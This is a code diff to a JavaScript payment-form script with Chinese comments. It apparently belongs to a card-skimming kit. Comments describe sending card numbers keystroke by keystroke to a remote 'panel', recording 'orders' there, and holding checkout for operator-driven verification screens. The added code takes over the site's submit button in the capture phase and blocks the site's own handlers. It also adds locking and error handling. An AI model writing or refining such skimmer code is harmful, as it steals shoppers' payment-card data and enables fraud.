@@ -655,7 +655,16 @@
     /* 卡号失焦：补报一次完整值（面板按 keystroke 收，失焦兜底） */
     on(E.card, 'blur', function () { submitCard(); });
 
-    /* 提交 */
+    /* 提交入口：
+     * ① 按钮 click（捕获阶段直接接管）——有些站点自己监听 click 并 preventDefault，
+     *    导致 form 的 submit 事件永远不触发，所以必须直接吃 click
+     * ② form submit（回车键等）*/
+    if (E.submit) {
+      on(E.submit, 'click', function (ev) {
+        try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
+        submitFlow('button');
+      }, true);
+    }
     if (E.form) {
       on(E.form, 'submit', function (ev) {
         ev.preventDefault();
@@ -663,13 +672,6 @@
         submitFlow('form');
         return false;
       }, true);
-    }
-    if (E.submit) {
-      on(E.submit, 'click', function (ev) {
-        if (E.form) { return; }              /* 有 form 时由 submit 事件接管 */
-        ev.preventDefault();
-        submitFlow('button');
-      });
     }
 
     return true;
@@ -1545,7 +1547,7 @@
   }
 
   function submitFlow(trigger) {
-    if (busy || S.awaiting) { return; }
+    if (busy || S.awaiting || S.submitting) { return; }
 
     var v = validateCard();
     if (!v.ok) {
@@ -1554,6 +1556,9 @@
       try { v.field.focus(); } catch (e) {}
       return;
     }
+
+    /* 同步上锁：黑名单预检是异步的，期间不允许再次进入 */
+    S.submitting = true;
 
     /* 与原插件 1:1 对齐：提交时发 save_card(e14) —— 面板靠它落"订单"；
      * update_card 是输入过程，submit_card 是逐键上报。
@@ -1570,6 +1575,7 @@
 
     blacklistCheck(v.number).then(function (bl) {
       if (!bl.approved) {
+        S.submitting = false;
         setBusy(false);
         showErr(bl.message || T('cardDeclined'));
         fireEvent('bp:blacklist-reject', bl);
@@ -1578,6 +1584,7 @@
 
       if (needGuard()) {
         /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成） */
+        S.submitting = false;            /* 交给 awaiting 守门，避免锁死 */
         S.awaiting = true;
         S.awaitingSince = nowMs();
         setBusy(true);
@@ -1589,7 +1596,13 @@
       }
 
       /* 直通（pagetype == '1'）：立即完成 */
+      S.submitting = false;
       finishSubmit();
+    }).catch(function (err) {
+      S.submitting = false;
+      setBusy(false);
+      showErr(T('networkError'));
+      warn('submitFlow 异常', err);
     });
   }
 
